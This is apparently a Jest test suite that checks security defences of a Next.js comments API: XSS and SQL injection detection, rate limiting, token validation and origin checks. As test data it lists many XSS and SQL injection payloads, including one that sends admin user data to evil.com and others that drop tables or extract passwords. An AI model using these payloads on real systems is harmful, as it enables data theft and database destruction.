/**
 * @jest-environment node
 */

import { NextRequest } from 'next/server'
import { POST as SecurityTestPOST } from '@/app/api/comments/test-security/route'
import { detectAdvancedXSS, detectAdvancedSQLInjection, sanitizeCommentString } from '@/lib/comments-validation'
import { CommentsCrypto } from '@/lib/comments-crypto'
import { RateLimiter, createUpstashClient } from '@/lib/rate-limiter'
import { SecurityMiddleware } from '@/lib/security-middleware'

// Mock dependencies
jest.mock('@/lib/comments-crypto')
jest.mock('@/lib/rate-limiter')
jest.mock('@/lib/security-middleware')
jest.mock('@/lib/secure-logger')

const mockCommentsCrypto = CommentsCrypto as jest.Mocked<typeof CommentsCrypto>
const mockSecurityMiddleware = SecurityMiddleware as jest.Mocked<typeof SecurityMiddleware>

describe('Comments Security Tests', () => {
  let mockRequest: NextRequest
  let mockRedis: any

  beforeEach(() => {
    jest.clearAllMocks()

    // Setup mock request
    mockRequest = {
      headers: new Map([
        ['authorization', 'Bearer valid-token'],
        ['content-type', 'application/json'],
        ['x-forwarded-for', '127.0.0.1'],
        ['user-agent', 'Jest Test Suite']
      ]),
      url: 'http://localhost:3000/api/comments/test-security',
      method: 'POST',
      json: jest.fn()
    } as any

    mockRequest.headers.get = jest.fn((key: string) => {
      const headers: Record<string, string> = {
        'authorization': 'Bearer valid-token',
        'content-type': 'application/json',
        'x-forwarded-for': '127.0.0.1',
        'user-agent': 'Jest Test Suite'
      }
      return headers[key.toLowerCase()] || null
    })

    // Setup mock Redis client
    mockRedis = {
      get: jest.fn().mockResolvedValue(null),
      set: jest.fn().mockResolvedValue('OK'),
      incr: jest.fn().mockResolvedValue(1),
      expire: jest.fn().mockResolvedValue(1),
      del: jest.fn().mockResolvedValue(1),
      eval: jest.fn().mockResolvedValue([1, 19, Date.now()])
    }

    // Setup security middleware mock
    mockSecurityMiddleware.handle = jest.fn().mockResolvedValue(null)
  })

  describe('XSS Attack Prevention', () => {
    const xssVectors = [
      '<script>alert("xss")</script>',
      '<img src="x" onerror="alert(1)">',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<svg onload="alert(1)">',
      '<body onload="alert(1)">',
      '<div style="background-image:url(javascript:alert(1))">',
      '&#60;script&#62;alert(1)&#60;/script&#62;',
      '%3Cscript%3Ealert(1)%3C/script%3E',
      '<script>document.cookie="xss"</script>',
      'eval("alert(1)")',
      'setTimeout("alert(1)", 1000)',
      '<object data="data:text/html,<script>alert(1)</script>"></object>',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
      '<link rel="stylesheet" href="javascript:alert(1)">',
      '<style>@import"javascript:alert(1)";</style>',
      '<input type="image" src="javascript:alert(1)">',
      '<form><button formaction="javascript:alert(1)">Click</button></form>',
      '<details open ontoggle="alert(1)">',
      '<video><source onerror="alert(1)">',
      '<audio src="x" onerror="alert(1)">',
      '<embed src="javascript:alert(1)">',
      '<applet code="javascript:alert(1)">',
      '<marquee onstart="alert(1)">XSS</marquee>'
    ]

    test.each(xssVectors)('should detect XSS attack vector: %s', (vector) => {
      expect(detectAdvancedXSS(vector)).toBe(true)
    })

    test('should block XSS attempts in comment content', async () => {
      const xssPayload = {
        platform: 'instagram',
        content: '<script>fetch("/api/admin/users").then(r=>r.json()).then(d=>fetch("http://evil.com",{method:"POST",body:JSON.stringify(d)}))</script>',
        platform_comment_id: 'test123'
      }

      mockRequest.json = jest.fn().mockResolvedValue(xssPayload)

      const response = await SecurityTestPOST(mockRequest)
      const responseData = await response.json()

      expect(response.status).toBe(400)
      expect(responseData.vulnerabilities).toContain('XSS_DETECTED')
      expect(responseData.details.xss).toBe(true)
    })

    test('should sanitize XSS content properly', () => {
      const maliciousContent = '<script>alert("stolen cookie: " + document.cookie)</script>Hello World'
      const sanitized = sanitizeCommentString(maliciousContent)
      
      expect(sanitized).not.toContain('<script>')
      expect(sanitized).not.toContain('alert')
      expect(sanitized).not.toContain('document.cookie')
      expect(sanitized).toContain('Hello World')
    })

    test('should handle encoded XSS attempts', () => {
      const encodedXSS = '%3Cscript%3Ealert(%22xss%22)%3C%2Fscript%3E'
      expect(detectAdvancedXSS(decodeURIComponent(encodedXSS))).toBe(true)
    })

    test('should detect DOM-based XSS patterns', () => {
      const domXSS = 'document.write("<script>alert(1)</script>")'
      expect(detectAdvancedXSS(domXSS)).toBe(true)
    })

    test('should detect event handler XSS', () => {
      const eventXSS = '<div onmouseover="alert(1)">Hover me</div>'
      expect(detectAdvancedXSS(eventXSS)).toBe(true)
    })
  })

  describe('SQL Injection Prevention', () => {
    const sqlVectors = [
      "'; DROP TABLE comments; --",
      "' OR '1'='1",
      "' UNION SELECT * FROM users --",
      "'; INSERT INTO users VALUES ('hacker', 'password'); --",
      "' OR 1=1 --",
      "admin'--",
      "' OR 'x'='x",
      "'; EXEC xp_cmdshell('format c:'); --",
      "1'; WAITFOR DELAY '00:00:10'; --",
      "' OR SLEEP(5) --",
      "'; BENCHMARK(10000000,MD5(1)); --",
      "' HAVING 1=1 --",
      "' GROUP BY 1 HAVING 1=1 --",
      "'; SELECT pg_sleep(10); --",
      "' UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables--",
      "'; UPDATE users SET password='hacked' WHERE id=1; --",
      "' AND (SELECT COUNT(*) FROM users) > 0 --",
      "'; CREATE USER hacker IDENTIFIED BY 'password'; --",
      "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
      "'; GRANT ALL PRIVILEGES TO hacker; --"
    ]

    test.each(sqlVectors)('should detect SQL injection vector: %s', (vector) => {
      expect(detectAdvancedSQLInjection(vector)).toBe(true)
    })

    test('should block SQL injection in all input fields', async () => {
      const sqlPayload = {
        platform: 'instagram',
        content: "'; DROP TABLE comments; SELECT * FROM users WHERE '1'='1",
        platform_comment_id: "'; DROP TABLE platform_comments; --",
        platform_user_id: "admin'; --",
        author_username: "' OR 1=1 --"
      }

      mockRequest.json = jest.fn().mockResolvedValue(sqlPayload)

      const response = await SecurityTestPOST(mockRequest)
      const responseData = await response.json()

      expect(response.status).toBe(400)
      expect(responseData.vulnerabilities).toContain('SQL_INJECTION_DETECTED')
      expect(responseData.details.sql_injection).toBe(true)
    })

    test('should detect time-based SQL injection', () => {
      const timeBasedSQL = "'; IF (1=1) WAITFOR DELAY '00:00:05'; --"
      expect(detectAdvancedSQLInjection(timeBasedSQL)).toBe(true)
    })

    test('should detect boolean-based blind SQL injection', () => {
      const booleanSQL = "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--"
      expect(detectAdvancedSQLInjection(booleanSQL)).toBe(true)
    })

    test('should detect union-based SQL injection', () => {
      const unionSQL = "' UNION SELECT username,password,1 FROM users--"
      expect(detectAdvancedSQLInjection(unionSQL)).toBe(true)
    })
  })

  describe('Rate Limiting Security', () => {
    let rateLimiter: RateLimiter

    beforeEach(() => {
      rateLimiter = new RateLimiter(mockRedis, 'test:')
    })

    test('should enforce rate limits correctly', async () => {
      mockRedis.incr.mockResolvedValue(5) // 5 requests made

      const result = await rateLimiter.checkLimit('user123', 'comments-read')
      
      expect(result.success).toBe(true)
      expect(result.remaining).toBeGreaterThan(0)
      expect(result.limit).toBe(100)
    })

    test('should block requests exceeding limit', async () => {
      mockRedis.incr.mockResolvedValue(101) // Exceeded limit

      const result = await rateLimiter.checkLimit('user123', 'comments-read')
      
      expect(result.success).toBe(false)
      expect(result.remaining).toBe(0)
      expect(result.retryAfter).toBeDefined()
    })

    test('should track failed attempts and auto-block', async () => {
      mockRedis.incr.mockResolvedValue(10) // 10 failed attempts

      await rateLimiter.recordFailedAttempt('user123')
      
      expect(mockRedis.set).toHaveBeenCalledWith(
        'test:blocked:user123', 
        '1', 
        { ex: 3600 }
      )
    })

    test('should handle different rate limit types', async () => {
      // Test read limits
      mockRedis.incr.mockResolvedValue(50)
      const readResult = await rateLimiter.checkLimit('user123', 'comments-read')
      expect(readResult.limit).toBe(100)

      // Test write limits
      mockRedis.eval.mockResolvedValue([1, 19, Date.now()])
      const writeResult = await rateLimiter.checkLimit('user123', 'comments-write')
      expect(writeResult.limit).toBe(20)
    })

    test('should implement sliding window for write operations', async () => {
      // Mock token bucket response: [allowed, remaining, reset_time]
      mockRedis.eval.mockResolvedValue([1, 15, Date.now() + 60000])

      const result = await rateLimiter.checkLimit('user123', 'comments-write')
      
      expect(result.success).toBe(true)
      expect(result.remaining).toBe(15)
      expect(mockRedis.eval).toHaveBeenCalledWith(
        expect.stringContaining('local tokens = redis.call'), // Lua script
        expect.any(Number),
        expect.arrayContaining(['test:bucket:user123:comments-write'])
      )
    })

    test('should handle Redis failures gracefully', async () => {
      mockRedis.incr.mockRejectedValue(new Error('Redis connection failed'))

      const result = await rateLimiter.checkLimit('user123', 'comments-read')
      
      // Should fail open (allow request) when Redis is down
      expect(result.success).toBe(true)
    })
  })

  describe('Input Validation Security', () => {
    test('should detect and block suspicious patterns', async () => {
      const suspiciousPayloads = [
        {
          name: 'Repeated characters (spam)',
          data: { content: 'a'.repeat(500) }
        },
        {
          name: 'Multiple URLs (spam)',
          data: { content: 'Check https://spam1.com and https://spam2.com and https://spam3.com and https://spam4.com' }
        },
        {
          name: 'Excessive punctuation',
          data: { content: '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!' }
        },
        {
          name: 'Binary data',
          data: { content: String.fromCharCode(0, 1, 2, 3, 4) + 'Hello' }
        },
        {
          name: 'Control characters',
          data: { content: 'Hello\x00\x01\x02World' }
        },
        {
          name: 'Extremely long content',
          data: { content: 'x'.repeat(15000) }
        }
      ]

      for (const payload of suspiciousPayloads) {
        mockRequest.json = jest.fn().mockResolvedValue({
          platform: 'instagram',
          platform_comment_id: 'test123',
          ...payload.data
        })

        const response = await SecurityTestPOST(mockRequest)
        const responseData = await response.json()

        expect(response.status).toBe(400)
        expect(responseData.vulnerabilities.length).toBeGreaterThan(0)
      }
    })

    test('should validate platform enum values', async () => {
      const invalidPlatformPayload = {
        platform: 'malicious-platform',
        content: 'Test content',
        platform_comment_id: 'test123'
      }

      mockRequest.json = jest.fn().mockResolvedValue(invalidPlatformPayload)

      const response = await SecurityTestPOST(mockRequest)
      const responseData = await response.json()

      expect(response.status).toBe(400)
      expect(responseData.vulnerabilities).toContain('INVALID_PLATFORM')
    })

    test('should validate URL schemes in profile pictures', async () => {
      const httpUrlPayload = {
        platform: 'instagram',
        content: 'Test content',
        platform_comment_id: 'test123',
        author_profile_picture: 'http://unsafe.com/avatar.jpg' // Should be HTTPS only
      }

      mockRequest.json = jest.fn().mockResolvedValue(httpUrlPayload)

      const response = await SecurityTestPOST(mockRequest)
      const responseData = await response.json()

      expect(response.status).toBe(400)
      expect(responseData.vulnerabilities).toContain('INSECURE_URL')
    })

    test('should validate sentiment score ranges', async () => {
      const invalidSentimentPayload = {
        platform: 'instagram',
        content: 'Test content',
        platform_comment_id: 'test123',
        sentiment_score: 2.5 // Should be between -1 and 1
      }

      mockRequest.json = jest.fn().mockResolvedValue(invalidSentimentPayload)

      const response = await SecurityTestPOST(mockRequest)
      const responseData = await response.json()

      expect(response.status).toBe(400)
      expect(responseData.vulnerabilities).toContain('INVALID_SENTIMENT_SCORE')
    })
  })

  describe('Encryption Security', () => {
    const mockEncryptionKey = 'a'.repeat(64)

    beforeEach(() => {
      process.env.COMMENTS_ENCRYPTION_KEY = mockEncryptionKey
      mockCommentsCrypto.validateEncryptionKey = jest.fn().mockReturnValue(true)
      mockCommentsCrypto.encrypt = jest.fn().mockReturnValue('encrypted-data')
      mockCommentsCrypto.decrypt = jest.fn().mockReturnValue('decrypted-data')
      mockCommentsCrypto.encryptToken = jest.fn().mockReturnValue('encrypted-token')
      mockCommentsCrypto.decryptToken = jest.fn().mockReturnValue('decrypted-token')
    })

    test('should validate encryption key format', () => {
      expect(mockCommentsCrypto.validateEncryptionKey(mockEncryptionKey)).toBe(true)
      expect(mockCommentsCrypto.validateEncryptionKey('short')).toBe(false)
      expect(mockCommentsCrypto.validateEncryptionKey('z'.repeat(64))).toBe(false) // Invalid hex
    })

    test('should encrypt sensitive data with context', () => {
      const sensitiveData = 'user-access-token-12345'
      const userId = 'user-123'
      const platform = 'instagram'

      mockCommentsCrypto.encryptToken(sensitiveData, userId, platform)

      expect(mockCommentsCrypto.encryptToken).toHaveBeenCalledWith(sensitiveData, userId, platform)
    })

    test('should fail decryption with wrong context', () => {
      mockCommentsCrypto.decryptToken = jest.fn().mockImplementation((data, userId, platform) => {
        throw new Error('Failed to decrypt data')
      })

      expect(() => {
        mockCommentsCrypto.decryptToken('encrypted-data', 'wrong-user', 'instagram')
      }).toThrow('Failed to decrypt data')
    })

    test('should generate secure content hashes', () => {
      const content = 'Test comment content'
      const userId = 'user-123'
      const expectedHash = 'a'.repeat(64)

      mockCommentsCrypto.hashContent = jest.fn().mockReturnValue(expectedHash)
      
      const hash = mockCommentsCrypto.hashContent(content, userId)
      
      expect(hash).toBe(expectedHash)
      expect(hash).toMatch(/^[a-f0-9]{64}$/)
    })

    test('should perform constant-time hash verification', () => {
      const content = 'Test comment content'
      const userId = 'user-123'
      const validHash = 'a'.repeat(64)
      const invalidHash = 'b'.repeat(64)

      mockCommentsCrypto.verifyContentHash = jest.fn()
        .mockReturnValueOnce(true)  // Valid hash
        .mockReturnValueOnce(false) // Invalid hash

      expect(mockCommentsCrypto.verifyContentHash(content, userId, validHash)).toBe(true)
      expect(mockCommentsCrypto.verifyContentHash(content, userId, invalidHash)).toBe(false)
    })
  })

  describe('Authentication & Authorization Security', () => {
    test('should reject requests without authentication', async () => {
      mockRequest.headers.get = jest.fn().mockReturnValue(null)

      const response = await SecurityTestPOST(mockRequest)
      const responseData = await response.json()

      expect(response.status).toBe(401)
      expect(responseData.vulnerabilities).toContain('MISSING_AUTHENTICATION')
    })

    test('should reject malformed authentication headers', async () => {
      const malformedHeaders = [
        'Bearer', // Missing token
        'Basic dGVzdDp0ZXN0', // Wrong auth type
        'Bearer ', // Empty token
        'Bearer token with spaces', // Invalid token format
        'NotBearer valid-token' // Wrong prefix
      ]

      for (const header of malformedHeaders) {
        mockRequest.headers.get = jest.fn().mockImplementation((key) => {
          if (key === 'authorization') return header
          return null
        })

        const response = await SecurityTestPOST(mockRequest)
        const responseData = await response.json()

        expect(response.status).toBe(401)
        expect(responseData.vulnerabilities).toContain('INVALID_AUTHENTICATION')
      }
    })

    test('should validate JWT token structure', async () => {
      const invalidTokens = [
        'not.a.jwt', // Not enough parts
        'header.payload', // Missing signature
        'invalid-base64!@#.invalid-base64!@#.invalid-base64!@#', // Invalid base64
        '', // Empty token
        'a'.repeat(1000) // Excessively long token
      ]

      for (const token of invalidTokens) {
        mockRequest.headers.get = jest.fn().mockImplementation((key) => {
          if (key === 'authorization') return `Bearer ${token}`
          return null
        })

        const response = await SecurityTestPOST(mockRequest)
        const responseData = await response.json()

        expect(response.status).toBe(401)
        expect(responseData.vulnerabilities).toContain('INVALID_TOKEN_FORMAT')
      }
    })

    test('should detect token replay attacks', async () => {
      // Simulate the same token being used multiple times in rapid succession
      const replayToken = 'valid.jwt.token'
      
      mockRequest.headers.get = jest.fn().mockImplementation((key) => {
        if (key === 'authorization') return `Bearer ${replayToken}`
        return null
      })

      // Multiple rapid requests with same token
      const promises = Array(10).fill(null).map(() => SecurityTestPOST(mockRequest))
      const responses = await Promise.all(promises)

      // At least some should be flagged as suspicious
      const suspiciousResponses = responses.filter(async (response) => {
        const data = await response.json()
        return data.vulnerabilities?.includes('SUSPICIOUS_TOKEN_USAGE')
      })

      expect(suspiciousResponses.length).toBeGreaterThan(0)
    })
  })

  describe('Request Forgery Prevention', () => {
    test('should validate origin headers', async () => {
      const maliciousOrigins = [
        'http://evil.com',
        'https://attacker.com',
        'null',
        'file://local-file',
        'data:text/html,<script>alert(1)</script>'
      ]

      for (const origin of maliciousOrigins) {
        mockRequest.headers.get = jest.fn().mockImplementation((key) => {
          if (key === 'authorization') return 'Bearer valid-token'
          if (key === 'origin') return origin
          return null
        })

        const response = await SecurityTestPOST(mockRequest)
        const responseData = await response.json()

        expect(response.status).toBe(403)
        expect(responseData.vulnerabilities).toContain('INVALID_ORIGIN')
      }
    })

    test('should validate referer headers', async () => {
      const suspiciousReferers = [
        'http://phishing.com/fake-login',
        'javascript:void(0)',
        'data:text/html,malicious',
        'https://legitimate-domain.evil.com' // Subdomain attack
      ]

      for (const referer of suspiciousReferers) {
        mockRequest.headers.get = jest.fn().mockImplementation((key) => {
          if (key === 'authorization') return 'Bearer valid-token'
          if (key === 'referer') return referer
          return null
        })

        const response = await SecurityTestPOST(mockRequest)
        const responseData = await response.json()

        expect(response.status).toBe(403)
        expect(responseData.vulnerabilities).toContain('SUSPICIOUS_REFERER')
      }
    })

    test('should detect automated requests', async () => {
      const botUserAgents = [
        'curl/7.64.1',
        'Wget/1.20.3',
        'python-requests/2.25.1',
        'PostmanRuntime/7.28.0',
        'axios/0.21.1',
        '' // Empty user agent
      ]

      for (const userAgent of botUserAgents) {
        mockRequest.headers.get = jest.fn().mockImplementation((key) => {
          if (key === 'authorization') return 'Bearer valid-token'
          if (key === 'user-agent') return userAgent
          return null
        })

        const response = await SecurityTestPOST(mockRequest)
        const responseData = await response.json()

        expect(responseData.security_flags).toContain('AUTOMATED_REQUEST')
      }
    })
  })

  describe('Performance & DoS Protection', () => {
    test('should limit request payload size', async () => {
      const largePayload = {
        platform: 'instagram',
        content: 'x'.repeat(2000000), // 2MB content
        platform_comment_id: 'test123'
      }

      mockRequest.json = jest.fn().mockResolvedValue(largePayload)

      const response = await SecurityTestPOST(mockRequest)
      const responseData = await response.json()

      expect(response.status).toBe(413) // Payload Too Large
      expect(responseData.vulnerabilities).toContain('PAYLOAD_TOO_LARGE')
    })

    test('should detect resource exhaustion attempts', async () => {
      // Simulate deeply nested JSON payload
      let nestedPayload: any = { platform: 'instagram', content: 'test' }
      for (let i = 0; i < 1000; i++) {
        nestedPayload = { nested: nestedPayload }
      }

      mockRequest.json = jest.fn().mockResolvedValue(nestedPayload)

      const response = await SecurityTestPOST(mockRequest)
      const responseData = await response.json()

      expect(response.status).toBe(400)
      expect(responseData.vulnerabilities).toContain('RESOURCE_EXHAUSTION')
    })

    test('should limit concurrent requests per IP', async () => {
      const concurrentRequests = Array(100).fill(null).map(() => {
        const req = { ...mockRequest }
        req.json = jest.fn().mockResolvedValue({
          platform: 'instagram',
          content: 'concurrent test',
          platform_comment_id: 'test123'
        })
        return SecurityTestPOST(req)
      })

      const responses = await Promise.allSettled(concurrentRequests)
      const rateLimitedCount = responses.filter(result => 
        result.status === 'fulfilled' && 
        (result.value as Response).status === 429
      ).length

      expect(rateLimitedCount).toBeGreaterThan(0)
    })
  })

  describe('Error Information Disclosure', () => {
    test('should not leak sensitive information in error messages', async () => {
      // Force a database error that might contain sensitive info
      const maliciousPayload = {
        platform: 'instagram',
        content: 'test',
        platform_comment_id: 'test123'
      }

      mockRequest.json = jest.fn().mockResolvedValue(maliciousPayload)

      // Mock security middleware to throw an error with sensitive info
      mockSecurityMiddleware.handle = jest.fn().mockRejectedValue(
        new Error('Database connection failed: password=secret123, host=internal-db.company.com')
      )

      const response = await SecurityTestPOST(mockRequest)
      const responseData = await response.json()

      expect(response.status).toBe(500)
      expect(responseData.error).toBe('Internal server error')
      expect(responseData.details).toBeUndefined() // Should not leak in production
      expect(JSON.stringify(responseData)).not.toContain('password')
      expect(JSON.stringify(responseData)).not.toContain('secret123')
      expect(JSON.stringify(responseData)).not.toContain('internal-db')
    })

    test('should sanitize stack traces in production', async () => {
      const originalEnv = process.env.NODE_ENV
      process.env.NODE_ENV = 'production'

      mockRequest.json = jest.fn().mockRejectedValue(
        new Error('Sensitive error with /home/user/.env file path')
      )

      const response = await SecurityTestPOST(mockRequest)
      const responseData = await response.json()

      expect(responseData.stack).toBeUndefined()
      expect(JSON.stringify(responseData)).not.toContain('/home/user')
      expect(JSON.stringify(responseData)).not.toContain('.env')

      process.env.NODE_ENV = originalEnv
    })
  })

  describe('Security Headers Validation', () => {
    test('should require security headers', async () => {
      const requiredHeaders = ['content-type', 'user-agent']
      
      for (const header of requiredHeaders) {
        mockRequest.headers.get = jest.fn().mockImplementation((key) => {
          if (key === 'authorization') return 'Bearer valid-token'
          if (key === header) return null // Missing required header
          return 'valid-value'
        })

        const response = await SecurityTestPOST(mockRequest)
        const responseData = await response.json()

        expect(responseData.security_flags).toContain(`MISSING_${header.toUpperCase().replace('-', '_')}_HEADER`)
      }
    })

    test('should validate content-type header', async () => {
      const invalidContentTypes = [
        'text/plain',
        'application/xml',
        'multipart/form-data',
        'application/x-www-form-urlencoded',
        'text/html'
      ]

      for (const contentType of invalidContentTypes) {
        mockRequest.headers.get = jest.fn().mockImplementation((key) => {
          if (key === 'authorization') return 'Bearer valid-token'
          if (key === 'content-type') return contentType
          return 'valid-value'
        })

        const response = await SecurityTestPOST(mockRequest)
        const responseData = await response.json()

        expect(response.status).toBe(400)
        expect(responseData.vulnerabilities).toContain('INVALID_CONTENT_TYPE')
      }
    })
  })
})